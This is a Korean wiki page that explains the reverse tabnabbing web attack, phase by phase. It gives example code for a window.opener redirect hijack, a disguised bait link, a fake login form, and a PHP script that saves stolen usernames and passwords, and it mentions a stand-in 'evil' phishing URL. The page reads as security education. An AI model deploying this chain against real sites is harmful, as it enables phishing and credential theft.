---
title: Reverse_Tabnabbing
description: 
published: true
date: 2025-07-25T19:29:12.138Z
tags: 
editor: markdown
dateCreated: 2025-07-22T16:38:12.568Z
---

# Reverse Tabnabbing

## 개요
“Reverse Tabnabbing”은 웹페이지에서 링크를 클릭해 열린 탭이나 창의 참조(opener)를 유지할 때 발생하는 보안 취약점이다. 브라우저의 탭 간 참조(opener) 연결을 이용해 원본 페이지의 DOM을 조작하거나 redirection시킬 수 있는 환경에 영향을 준다. 공격자는 열려있는 원본 페이지를 악성 페이지로 변경하여 사용자가 인식하지 못한 상태에서 민감한 정보를 입력하도록 유도할 수 있다. 결과적으로 사용자의 정보 유출, 세션 탈취 등 사회공학적 피해를 초래할 수 있다.

## 분류

> 컨텍스트 경계 불일치(Context Boundary Gap)  
> → 브라우저 탭 컨텍스트 불일치 (Browser Tab Context Mismatch)  
> → Reverse Tabnabbing

## 절차

<table>
  <thead>
    <tr>
      <th>Phase</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Reconnaissance</td>
      <td>타깃 사이트의 UGC 영역, HTTP 응답 헤더, CSP/COOP 설정을 조사해서 target=”_blank” 링크와 window.opener 보호 (rel = “noopener”, COOP, 취약 CSP) 부재 지점을 식별한다.</td>
    </tr>
    <tr>
      <td>Obfuscation</td>
      <td>공격용 하이퍼링크나 스크립트가 보안 필터·사용자 수동 검토에 바로 드러나지 않도록 형태를 변형,은닉한다.</td>
    </tr>
    <tr>
      <td>Manipulation</td>
      <td>클릭 시 자식 창에서 window.opener.location = “https://evil/fake_login.html” 등을 실행해서 부모 창의 URL, DOM, 히스토리를 공격자 제어 페이지로 전환한다.</td>
    </tr>
    <tr>
      <td>Validation</td>
      <td>부모 창에 의도한 대로 변조되었는지 URL 변화, UI 플리커, 서버 로그, performance.now() 지표로 확인한다.</td>
    </tr>
    <tr>
      <td>Exploitation</td>
      <td>변조된 부모 창에서 피싱 폼, 세션 스틸 스크립트, UI Redressing 등을 통해 사용자의 자격 증명이나 세션 토큰을 탈취, 악용한다.</td>
    </tr>
    <tr>
      <td>Exfiltration</td>
      <td>수집한 민감 정보를 Beacon, XHR, Websocket 등으로 공격자 서버에 전송하고 지속적 접근을 확보한다.</td>
    </tr>
  </tbody>
</table>

<div style="text-align: left;">
  <img
    src="/reverse_tabnabbing.png"
    alt="Reverse Tabnabbing 다이어그램"
    width="1000"
    style="display: block;
           margin: 0 0 1em 0;
           height: auto;"
  />
</div>

## 공격 기법

### Reconnaissance

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Vulnerability Identification</td>
      <td>
        <pre><code>&lt;a  href = "http://127.0.0.1:8080/Desktop/tab/malicious.html" target = "_blank"&gt; Click Here for a Great Deal! &lt;/a&gt;</code></pre>
      </td>
      <td>target="_blank" 속성을 사용하면서 rel="noopener" 속성이 누락된 외부 링크를 탐지한다. 타깃 사이트의 UGC 영역이나 HTTP 헤더(CSP/COOP) 설정을 조사하여 window.opener 객체 보호가 부재한 취약점을 식별한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Obfuscation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Social Engineering Camouflage</td>
      <td>
        <pre><code>&lt;!-- 사용자가 의심하지 않을 만한 문구 사용 --&gt;
&lt;h1&gt;Crazy deal on sunglasses!!! Limited supplies!!!&lt;/h1&gt;
&lt;a href="http://127.0.0.1:8080/malicious.html" target="_blank" rel="opener"&gt;CLICK HERE!&lt;/a&gt;</code></pre>
      </td>
      <td>정상적인 콘텐츠(이벤트, 할인 정보 등)로 위장한 하이퍼링크나 URL 단축 서비스를 사용하여, 사용자의 경계심을 낮추고 악성 링크를 클릭하도록 심리적으로 유도한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Manipulation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>window.opener Hijacking</td>
      <td>
        <pre><code>if (window.opener) {
  window.opener.location = "http://127.0.0.1:8080/Desktop/malicious_redir.html";
}</code></pre>
      </td>
      <td>새로 열린 자식 창에서 window.opener 객체를 사용하여, 사용자가 인지하지 못하는 사이 원본 부모 창의 주소(location)를 공격자가 제어하는 피싱 페이지로 몰래 변경한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Validation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Attack Success Validation</td>
      <td>
        <pre><code># 공격자 서버에서 수신 로그 확인 또는
# 자동화된 브라우저로 리디렉션 여부 확인
curl -I http://original-site.com/</code></pre>
      </td>
      <td>공격자의 피싱 서버 로그를 확인하거나 headless 브라우저를 이용한 자동화 테스트를 통해, 부모 창의 리디렉션이 성공적으로 이루어졌는지 기술적으로 확인하여 공격의 작동 여부를 검증한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Exploitation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Credential Harvesting (Phishing)</td>
      <td>
        <pre><code>&lt;!-- fake_login.html --&gt;
&lt;body&gt;
  &lt;h2&gt;Login Page-Fake&lt;/h2&gt;&lt;br&gt;
  &lt;label&gt;&lt;b&gt;User Name&lt;/b&gt;&lt;/label&gt;
  &lt;input type="text" name="Uname" id="Uname" placeholder="Username"&gt;
  &lt;br&gt;&lt;br&gt;
  &lt;label&gt;&lt;b&gt;Password&lt;/b&gt;&lt;/label&gt;
  &lt;input type="Password" name="Pass" id="Pass" placeholder="Password"&gt;
  &lt;br&gt;&lt;br&gt;
  &lt;input type="button" name="log" id="log" value="Log In Here"&gt;
&lt;/body&gt;</code></pre>
      </td>
      <td>원본 사이트와 똑같이 제작된 가짜 로그인 페이지를 사용자에게 노출시켜, 신뢰된 사이트로 착각하게 만든 후 아이디, 비밀번호 등 민감한 자격 증명을 입력하도록 유도하여 탈취한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Exfiltration

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Data Exfiltration</td>
      <td>
        <pre><code>&lt;?php
// 공격자 서버의 스크립트 예시
$username = $_POST['Uname'];
$password = $_POST['Pass'];
file_put_contents('credentials.txt', "User: $username, Pass: $password\n", FILE_APPEND);
header('Location: http://original-site.com/login-error'); // 사용자를 다시 원래 사이트로 보냄
exit();
?&gt;</code></pre>
      </td>
      <td>피싱 페이지의 form 제출이나 비동기 통신(XHR, Beacon)을 통해, 사용자가 입력한 자격 증명을 공격자의 서버로 전송하여 저장하고, 이를 통해 계정 탈취 등 추가 공격을 준비한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

---

## 분류에 해당하는 문서
- [1]  https://medium.com/@ibm_ptc_security/reverse-tabnabbing-ccede451d444

## 기타 참고 문헌

- \[A\] [OWASP Web Security Testing Guide \| OWASP Foundation](https://owasp.org/www-project-web-security-testing-guide/)  
- \[B\] [Reverse Tabnabbing](https://medium.com/@ibm_ptc_security/reverse-tabnabbing-ccede451d444)  
- \[C\] [What is reverse tabnabbing and how can you prevent it?](https://www.comparitech.com/blog/information-security/reverse-tabnabbing/)  
- \[D\] [Research, News, and Perspectives](https://www.trendmicro.com/en_us/research.html)  
- \[E\] [APT28 … Group G0007 \| MITRE ATT&CK®](https://attack.mitre.org/groups/G0007/)  
